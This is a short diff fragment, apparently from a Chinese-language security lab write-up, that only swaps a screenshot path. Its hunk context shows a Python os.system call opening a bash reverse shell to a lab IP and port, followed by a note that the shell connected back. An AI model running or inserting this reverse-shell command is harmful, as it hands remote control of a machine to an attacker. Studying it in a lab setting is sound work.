@@ -531,4 +531,4 @@ os.system('bash -c "bash -i >& /dev/tcp/192.168.32.130/12345 0>&1"')
 
 成功反弹成功
 
-![image-20220617162610152](../../.gitbook/assets/image-20220617162610152.png)
+![image-20230208160530051](../../.gitbook/assets/image-20230208160530051.png)
